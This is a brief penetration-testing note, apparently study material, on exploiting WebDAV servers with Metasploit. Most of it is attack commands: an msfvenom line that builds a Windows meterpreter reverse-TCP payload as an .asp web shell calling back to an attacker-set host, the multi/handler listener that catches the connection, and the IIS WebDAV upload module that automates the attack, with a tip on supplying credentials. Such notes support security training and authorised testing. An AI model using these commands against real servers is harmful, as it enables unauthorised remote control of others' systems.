
- We can use `metasploit` to generate payloads to exploit `webdav`

### Using `msfvenom` to generate a `.asp` payload

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<lhost> LPORT=<lport> -f asp > shell.asp
```

- This command will generate a payload for x86 (32 bit) system.
- If the system architecture is unknown, it is advisable to utilize a 32-bit payload since it can function on both 32-bit and 64-bit systems.
- We are setting the file format `-f` to `asp`.

### Setting up a listener

```
use multi/handler
```
*It is a metasploit module to set-up a listener.*

*Setting up payload to listen for:*

```
set payload windows/meterpreter/reverse_tcp
```
*This has to be the same payload that we specified earlier to generate the asp payload.*

### `metaploit` module to automate this process

```
use exploit/windows/iis/iis_webdav_upload_asp
```

- If the webdav server requires authorisation, set `HttpPassword` and `HttpUsername`.